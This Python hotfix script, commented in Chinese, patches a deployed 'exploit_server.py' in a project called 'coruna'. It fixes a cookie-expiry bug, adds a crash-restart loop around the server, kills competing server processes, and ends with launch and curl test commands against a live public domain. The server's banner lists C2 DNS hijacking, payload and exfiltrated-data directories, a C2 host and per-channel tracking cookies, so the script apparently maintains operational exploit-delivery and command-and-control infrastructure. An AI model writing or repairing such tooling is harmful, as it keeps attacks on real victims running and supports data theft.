# -*- coding: utf-8 -*-
"""
_v204_hotfix15v3.py  100% 精确修复 (不再扫字符串)

  FIX-A (PATCH1+2): 锚定真实 banner L=3894 (indent_n=4)  → 替换 main() 尾部
  FIX-B (PATCH3)   : 锚定真实 bug 块 L=2586~2593 ({expires})  → 补 expires='' + try/except
"""
import os, sys, time, shutil, ast, re

SELF_FILE = os.path.abspath(__file__)
try:
    with open(SELF_FILE, 'r', encoding='utf-8') as _me:
        ast.parse(_me.read())
    print('[SELF-AST-OK] ✅ hotfix15v3 self AST PASS')
except SyntaxError as _e:
    print(f'[SELF-AST-FAIL] ❌ L{_e.lineno} off={_e.offset}: {_e.msg}')
    sys.exit(2)

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix15v3')
os.makedirs(BAKDIR, exist_ok=True)

ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src = src_bytes.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n')
lines = src.split('\n')
N_LINES = len(lines)
print(f'[INFO] ORIG_NL={ORIG_NL!r} total lines={N_LINES} orig_size={len(src)}')

# ═══════════════════════════════════════════════════════════════
# FIX-B FIRST: PATCH3 - 精确修 L2586~2593 (bug 块: if tpl_slug: expires=… 下面 log_cid/log_tid 没 expires!)
#   策略: 从 L2585 向下扫 12 行, 查找 "if tpl_slug:" 之后, "self.end_headers()" 之前,
#         如果出现 "ds_chid=… {expires}" 但前面没有 "expires = ''" 初始化, 就整段替换.
# ═══════════════════════════════════════════════════════════════
SEED_L = 2583   # L2583 send_response(302)
SEARCH_WIN = 15 # 往后 15 行
WIN = lines[SEED_L-1 : SEED_L-1 + SEARCH_WIN]
print(f'[PATCH3-SEED] L{SEED_L}-L{SEED_L+SEARCH_WIN-1} scan window:')
for j in range(len(WIN)):
    L = SEED_L + j
    mark = '   '
    if re.search(r'if\s+tpl_slug\s*:', WIN[j]): mark += '⚑ tpl_slug if'
    if '{expires}' in WIN[j]: mark += '⚑ {expires}'
    if re.search(r'self\.end_headers\(\)', WIN[j]): mark += '⚑ end_headers'
    print(f'  L{L:4d}|{WIN[j][:120]}{mark}')

# 精确匹配: "if tpl_slug:\n        expires = …utctime + 86400…\n        self.send_header(Set-Cookie tpl=…)\n"
#           + "# Preserve channel info…\n" + "if log_cid:\n        self.send_header(Set-Cookie ds_chid=…{expires}…)\n"
#           + "if log_tid:\n        self.send_header(Set-Cookie ds_tpid=…{expires}…)"
# 构造 REGEX 匹配 7 行 (任意水平空白用 \s+ 匹配, 不依赖具体 indent_n!)
_P3_PAT = re.compile(
    r'(?P<ind>[ \t]*)if\s+tpl_slug\s*:\s*\n'
    r'(?P=ind)[ \t]*expires\s*=\s*"Expires="\s*\+\s*.*?86400\)\.strftime.*?GMT"\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"tpl=\{urllib\.parse\.quote\(tpl_slug\)\}.*?;.*?\{expires\}.*?SameSite=Lax"\)\s*\n'
    r'(?P=ind)[ \t]*#\s*Preserve\s+channel\s+info\s+for\s+legacy\s+Coruna\s*\n'
    r'(?P=ind)[ \t]*if\s+log_cid\s*:\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"ds_chid=\{log_cid\};\s*Path=/;\s*\{expires\};\s*SameSite=Lax"\)\s*\n'
    r'(?P=ind)[ \t]*if\s+log_tid\s*:\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"ds_tpid=\{log_tid\};\s*Path=/;\s*\{expires\};\s*SameSite=Lax"\)',
    re.DOTALL
)
m_p3 = _P3_PAT.search(src)
if not m_p3:
    print('[PATCH3] ❌ 正则没命中! 降级: 从 lines L2585 手动构造替换')
    # 降级: 直接找 L2586~L2593 共 8 行拼
    ind_match = re.match(r'^([ \t]*)', lines[2585])   # 0-index lines[2585]=L2586
    IND = ind_match.group(1) if ind_match else '            '
    OLD_P3_BLOCK = '\n'.join(lines[2585 : 2585 + 8])  # L2586~L2593
    print(f'[PATCH3-FALLBACK] indent_str len={len(IND)} block_len={len(OLD_P3_BLOCK)} chars')
    m_p3_start = src.index(OLD_P3_BLOCK)
    m_p3_end   = m_p3_start + len(OLD_P3_BLOCK)
    IND_SI = IND
else:
    m_p3_start = m_p3.start()
    m_p3_end   = m_p3.end()
    IND_SI = m_p3.group('ind')
print(f'[PATCH3] MATCH OFFSET {m_p3_start}:{m_p3_end} = {m_p3_end-m_p3_start} chars indent_spaces={len(IND_SI)}')

SI = IND_SI
DI = SI + '    '
NEW_P3 = (
f"""{SI}# PATCH v20.4-HOTFIX15v3-PATCH3: expires 先初始化为空, 防止 tpl_slug 假但 log_cid/log_tid 真 → UnboundLocalError curl(52) Empty reply
{SI}expires = ''
{SI}try:
{DI}if tpl_slug:
{DI}    expires = "Expires=" + __import__("datetime").datetime.utcfromtimestamp(__import__("time").time() + 86400).strftime("%a, %d-%b-%Y %H:%M:%S GMT")
{DI}    self.send_header("Set-Cookie", f"tpl={{urllib.parse.quote(tpl_slug)}}; Path=/; {{expires}}; SameSite=Lax")
{DI}# Preserve channel info for legacy Coruna
{DI}if log_cid:
{DI}    self.send_header("Set-Cookie", f"ds_chid={{log_cid}}; Path=/; {{expires}}; SameSite=Lax")
{DI}if log_tid:
{DI}    self.send_header("Set-Cookie", f"ds_tpid={{log_tid}}; Path=/; {{expires}}; SameSite=Lax")
{SI}except Exception as _hf15v3_p3_e:
{DI}try:
{DI}    import admin.common as _ac15
{DI}    if _ac15 and hasattr(_ac15, 'log_to_file'):
{DI}        _ac15.log_to_file(f"[EXPIRES-FALLBACK] do_GET cookie write err: {{_hf15v3_p3_e}}")
{DI}    else:
{DI}        print(f"[EXPIRES-FALLBACK] do_GET cookie err {{_hf15v3_p3_e}}", flush=True)
{DI}except Exception:
{DI}    pass"""
)
src = src[:m_p3_start] + NEW_P3 + src[m_p3_end:]
print(f'[PATCH3] ✅ 替换 {m_p3_end-m_p3_start} chars → {len(NEW_P3)} chars')
try:
    ast.parse(src); print('[PATCH3 AST] ✅ PASS')
except SyntaxError as e:
    print(f'[PATCH3 AST] ❌ L{e.lineno} off={e.offset}: {e.msg}')
    shutil.copy2(bak, ESFILE); sys.exit(3)

# ═══════════════════════════════════════════════════════════════
# FIX-A: PATCH1 main() banner 尾部替换. 精确锚定 L3894 0-index L3893
# ═══════════════════════════════════════════════════════════════
R1_START_LINE_1I = 3894
R1_START_LINE_0I = R1_START_LINE_1I - 1   # 3893
# 先验证 L3894 真的是 banner = f""" + 有 EXPLOIT SERVER - READY
banner_line = lines[R1_START_LINE_0I]
banner_5lines = '\n'.join(lines[R1_START_LINE_0I : R1_START_LINE_0I + 5])
if 'banner = f"""' not in banner_line or 'EXPLOIT SERVER - READY' not in banner_5lines:
    print(f'[FATAL R1] L{R1_START_LINE_1I} 不是真实 banner! 该行: {banner_line[:120]!r}')
    shutil.copy2(bak, ESFILE); sys.exit(4)
# 找 main 尾部的 banner 起始偏移
lines_so_far_1_to_R1 = '\n'.join(lines[:R1_START_LINE_0I]) + '\n'
R1_START = len(lines_so_far_1_to_R1) - 1   # 因为 lines 拆分无末尾\n, join 回来 +'\n' 正好对齐

# banner 尾部: 从 R1_START 往后找最后 1 个 server.shutdown() 所在行尾
TAIL = src[R1_START:]
sd_pos = [m.start() for m in re.finditer(r'server\.shutdown\(\)', TAIL)]
if not sd_pos:
    print(f'[FATAL R1] banner 段里没有 server.shutdown()'); shutil.copy2(bak, ESFILE); sys.exit(5)
LAST_SD_OFF = sd_pos[-1]
# 行尾
_NL = TAIL.find('\n', LAST_SD_OFF)
if _NL < 0: _NL = len(TAIL)
R1_END = R1_START + _NL
OLD_P1 = src[R1_START:R1_END]

# indent: banner_line.lstrip 差分
TI = banner_line[: len(banner_line) - len(banner_line.lstrip(' '))]
TI_N = len(TI)
if TI_N not in (4, 8):
    print(f'[R1 WARN] indent_n={TI_N} unusual (应 4 或 8). 继续.')
print(f'[PATCH1-R1] OFFSET {R1_START}:{R1_END} bytes={len(OLD_P1)} indent_str_len={TI_N} (TI_N={TI_N})')
print(f'[PATCH1-R1] FIRST 220 chars:')
print('\n'.join(['  │ ' + ln for ln in OLD_P1[:220].splitlines()]))
print(f'[PATCH1-R1] LAST  220 chars:')
print('\n'.join(['  │ ' + ln for ln in OLD_P1[-220:].splitlines()]))

SI = TI + '    '
DI = TI + '        '
SDI= TI + '            '
NEW_P1 = f'''{TI}banner = f"""
{TI}╔══════════════════════════════════════════════════════════════╗
{TI}║              EXPLOIT SERVER - READY                          ║
{TI}╠══════════════════════════════════════════════════════════════╣
{TI}║  Access URL:     http://{{args.host}}:{{args.port}}/
{TI}║                  http://localhost:{{args.port}}/
{TI}║  C2 DNS hijack:  Internal DNS -> {{args.host}}:80 (if bound)
{TI}║  Payloads dir:   {{PAYLOADS_DIR}}
{TI}║  Templates dir:  {{TEMPLATES_DIR}}
{TI}║  Exfil data dir: {{EXFIL_DIR}}
{TI}║  Log file:       {{LOG_FILE}}
{TI}║  DB available:   {{DB_AVAILABLE}}
{TI}╚══════════════════════════════════════════════════════════════╝
{TI}"""
{TI}if C2_HOST:
{TI}    banner += f"║  C2 Host:        {{C2_HOST}}\\n"
{TI}if REDIRECT_URL:
{TI}    banner += f"║  Redirect URL:   {{REDIRECT_URL}}\\n"
{TI}banner += "╚══════════════════════════════════════════════════════════════╝\\n"
{TI}banner += "\\n[!] Press Ctrl+C to stop\\n"
{TI}
{TI}print(banner)
{TI}startup_log = f"Exploit server started on http://{{args.host}}:{{args.port}} | DB={{DB_AVAILABLE}}"
{TI}log_to_file(startup_log)
{TI}log_to_file(f"Payloads: {{PAYLOADS_DIR}}")
{TI}log_to_file(f"Exfil dir: {{EXFIL_DIR}}")
{TI}log_to_file(f"Log file: {{LOG_FILE}}")
{TI}
{TI}# PATCH v20.4-HOTFIX15v3-R1: DS-READY-HF15v3 marker + self-connect + while True 永不返回
{TI}import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm
{TI}try:
{TI}    _ds_pid  = _diag_os.getpid()
{TI}    _ds_ppid = _diag_os.getppid()
{TI}    _ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1
{TI}    print(f"[DS-READY-HF15v3] pid={{_ds_pid}} ppid={{_ds_ppid}} pgid={{_ds_pgid}} port={{args.port}} → ENTER INFINITE serve_forever LOOP", flush=True)
{TI}    _diag_sys.stdout.flush(); _diag_sys.stderr.flush()
{TI}    _s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)
{TI}    _rr = _s1.connect_ex(("127.0.0.1", int(args.port)))
{TI}    print(f"[DS-READY-HF15v3] 127.0.0.1:{{args.port}} self-connect_ex={{_rr}} (0=LISTEN OK)", flush=True)
{TI}    _s1.close()
{TI}except Exception as _diag_e:
{TI}    print(f"[DS-READY-HF15v3] probe err {{type(_diag_e).__name__}}: {{_diag_e}}", flush=True)
{TI}
{TI}_ds_attempt = 0
{TI}while True:
{TI}    _ds_attempt += 1
{TI}    print(f"[DS-SF-LOOP] attempt={{_ds_attempt}} → server.serve_forever(poll=0.3)", flush=True)
{TI}    try:
{SI}server.serve_forever(poll_interval=0.3)
{DI}except KeyboardInterrupt:
{SI}stop_msg = "Server stopped by user."
{SI}print(f"\\n[*] {{stop_msg}}")
{SI}try: log_to_file(stop_msg)
{SI}except Exception: pass
{SI}try: server.shutdown()
{SI}except Exception: pass
{SI}break
{DI}except SystemExit as _ds_se:
{SI}print(f"[DS-SF-EXIT] SystemExit(code={{_ds_se.code}}) → propagate.", flush=True)
{SI}try: log_to_file(f"[DS-SF-EXIT] SystemExit {{_ds_se.code}}")
{SI}except Exception: pass
{SI}raise
{DI}except BaseException as _ds_sf_e:
{SI}import traceback as _ds_tb
{SI}_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")
{SI}_msg = f"[DS-CRASH-SF-{{_ds_attempt}}] [{{_ts}}] pid={{_ds_pid}} {{type(_ds_sf_e).__name__}}: {{_ds_sf_e}}"
{SI}print(_msg, flush=True)
{SI}try: log_to_file(_msg)
{SI}except Exception: pass
{SI}_ds_tb.print_exc()
{SI}if _ds_attempt >= 5:
{SDI}    print(f"[DS-CRASH-SF] serve_forever 连续崩溃 {{_ds_attempt}} 次 → SystemExit(88).", flush=True)
{SDI}    raise SystemExit(88)
{SI}print(f"[DS-CRASH-SF] 3s 后第 {{_ds_attempt+1}} 次重入 serve_forever...", flush=True)
{SI}try: _diag_tm.sleep(3)
{SDI}except (KeyboardInterrupt, SystemExit): pass
{SI}try: server.shutdown()
{SI}except Exception: pass
{SI}try: server.server_close()
{SI}except Exception: pass
{SI}_diag_tm.sleep(2)
{SI}try:
{SDI}    print(f"[DS-SF-REBIND] attempt {{_ds_attempt+1}} Rebind ReusableThreadingHTTPServer...", flush=True)
{SDI}    server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)
{SI}except Exception as _rebind_e:
{SDI}    print(f"[DS-SF-REBIND] 失败: {{type(_rebind_e).__name__}}: {{_rebind_e}}", flush=True)
{SDI}    _diag_tm.sleep(2)
{TI}print(f"[DS-SF-LOOP-END] KeyboardInterrupt/SystemExit → main return.", flush=True)
'''
src = src[:R1_START] + NEW_P1 + src[R1_END:]
print(f'[PATCH1-R1] ✅ 替换 {len(OLD_P1)} chars → {len(NEW_P1)} chars')

# ═══════════════════════════════════════════════════════════════
# FIX-A2 PATCH2: banner 正上方插入 PURGE 残留 (在 banner=f 上一行 插入 PREFLIGHT-PURGE 段)
# ═══════════════════════════════════════════════════════════════
NEW_SRC_LINES = src.split('\n')
# 重找 banner 在 NEW_SRC_LINES 里的位置 (TI 空格 开头, 有 'banner = f"""' , 附近含 'EXPLOIT SERVER - READY')
BANNER_NEW_L0 = None
for i in range(len(NEW_SRC_LINES)-1, max(0, len(NEW_SRC_LINES)-200), -1):
    ln = NEW_SRC_LINES[i]
    if (ln.startswith(TI + 'banner = f"""') and
        any('EXPLOIT SERVER - READY' in NEW_SRC_LINES[j] for j in range(i, min(len(NEW_SRC_LINES), i+10)))):
        BANNER_NEW_L0 = i; break
if BANNER_NEW_L0 is None:
    print('[PATCH2 WARN] 找不到 banner 在 NEW src 位置, 跳过 PURGE 段 (非致命)')
else:
    # 插入位置 = BANNER_NEW_L0 之前 (之前需要一行空行, 用 PURGE 首行空行分隔)
    PURGE_BLOCK_LINES = [
        '',
        TI + '# PATCH v20.4-HOTFIX15v3-R2: PURGE 除 self 外所有 exploit_server.py 残留 worker 防 LISTEN 抢端口',
        TI + 'try:',
        TI + '    import subprocess as _ds_sp, signal as _ds_sg, os as _ds_os, time as _ds_tm',
        TI + '    _my_pid = _ds_os.getpid()',
        TI + '    try:',
        TI + '        _ps_out = _ds_sp.run(["pgrep", "-af", "exploit_server.py"],',
        TI + '                              stdout=_ds_sp.PIPE, stderr=_ds_sp.DEVNULL, timeout=4, check=False).stdout.decode("utf-8","ignore")',
        TI + '    except Exception:',
        TI + '        _ps_out = ""',
        TI + '    _kp = []',
        TI + '    for _pln in _ps_out.splitlines():',
        TI + '        try:',
        TI + '            _parts = _pln.split(None, 1)',
        TI + '            if not _parts: continue',
        TI + '            _p = int(_parts[0])',
        TI + '            if _p != _my_pid and _p > 1 and _p != _ds_os.getppid():',
        TI + '                _cmd = (_parts[1] if len(_parts) > 1 else "").lower()',
        TI + "                if ('exploit_server' in _cmd) and ('nginx' not in _cmd) and ('mysqld' not in _cmd):",
        TI + '                    _kp.append(_p)',
        TI + '        except Exception:',
        TI + '            continue',
        TI + '    if _kp:',
        TI + '        print(f"[PREFLIGHT-PURGE] \U0001f534 清理残留 exploit_server PIDs={sorted(_kp)} (self={_my_pid})", flush=True)',
        TI + '        for _p in _kp:',
        TI + '            try: _ds_os.kill(_p, _ds_sg.SIGKILL)',
        TI + '            except Exception: pass',
        TI + '        _ds_tm.sleep(1.5)',
        TI + 'except Exception:',
        TI + '    pass',
    ]
    NEW_SRC_LINES = NEW_SRC_LINES[:BANNER_NEW_L0] + PURGE_BLOCK_LINES + NEW_SRC_LINES[BANNER_NEW_L0:]
    print(f'[PATCH2-R2] ✅ PURGE {len(PURGE_BLOCK_LINES)} 行 插入 L{BANNER_NEW_L0+1} 前')
    src = '\n'.join(NEW_SRC_LINES)

# ═══════════════════════════════════════════════════════════════
# FINAL SYNTAX
# ═══════════════════════════════════════════════════════════════
try:
    ast.parse(src); print('[FINAL AST] ✅ PASS')
except SyntaxError as e:
    print(f'[FINAL AST] ❌ L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for ek in range(max(1, e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{ek:4d}|{fl[ek-1][:180]}')
    shutil.copy2(bak, ESFILE); sys.exit(8)

if ORIG_NL == b'\r\n': fb = src.replace('\n', '\r\n').encode('utf-8')
else: fb = src.encode('utf-8')
with open(ESFILE, 'wb') as f: f.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] before={ORIG_SIZE} after={NEW_SIZE} delta={NEW_SIZE-ORIG_SIZE:+d}')

def gm(p):
    return sorted(set(1 + src[:m.start()].count('\n') for m in re.finditer(p, src, flags=re.MULTILINE)))
print(f'[VERIFY] DS-READY-HF15v3       L={gm(r"DS-READY-HF15v3")}')
print(f'[VERIFY] DS-SF-LOOP             L={gm(r"DS-SF-LOOP")}')
print(f'[VERIFY] PREFLIGHT-PURGE       L={gm(r"PREFLIGHT-PURGE")}')
print(f'[VERIFY] EXPIRES-FALLBACK      L={gm(r"EXPIRES-FALLBACK")}')
print(f'[VERIFY] SystemExit\\(88\\)      L={gm(r"SystemExit\(88\)")}')
print(f'[VERIFY] CH-SAFE-302           L={gm(r"CH-SAFE-302-(OK|SKIP)")}')
# 反向检查: 还有没有 'if tpl_slug:' 后面没有 'expires = ''' 的潜在残留?
for m in re.finditer(r'if\s+tpl_slug\s*:\s*\n([ \t]*)expires\s*=\s*"Expires=', src):
    BLOCK_START = m.start()
    BLOCK_AFTER = src[BLOCK_START : BLOCK_START + 1400]
    if 'expires = ' + repr("").strip("'") not in BLOCK_AFTER[:100]:
        # 判断该块下面有没有 ds_chid=… {expires}
        if 'ds_chid=' in BLOCK_AFTER and '{expires}' in BLOCK_AFTER:
            LNO = 1 + src[:BLOCK_START].count('\n')
            print(f'[VERIFY-WARN] 还有潜在 tpl_slug/expires 块 @ L{LNO} 没初始化为空, 可能风险')
print('✅ HOTFIX15v3 APPLY DONE')
print()
print('👉 启动:')
print('   pkill -9 -f exploit_server.py ; sleep 3')
print('   pgrep -af exploit_server.py ; ss -lntp | grep :7070  (均空才对!)')
print('   export DS_SKIP_PREFLIGHT_SETSID=1')
print('   cd /www/wwwroot/coruna/server')
print('   nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 -u exploit_server.py -H 0.0.0.0 -p 7070 --no-port-80 > /tmp/exploit_server.log 2>&1 &')
print('   echo NEW_PID=$! ; sleep 8')
print('   grep -nE "PREFLIGHT-PURGE|DS-READY-HF15v3|DS-SF-LOOP|DS-CRASH-SF|self-connect_ex=|EXPIRES-FALLBACK|UnboundLocalError" /tmp/exploit_server.log')
print('   curl -sS -o /dev/null -w "C1 t001 code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/test001')
print('   curl -sS -o /dev/null -w "C2 nex  code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/notexist_xyz')
print('   curl -sk -o /dev/null -w "C3 HPSt code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/test001')
print('   curl -sk -o /dev/null -w "C4 HPSn code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/notexist_xyz')
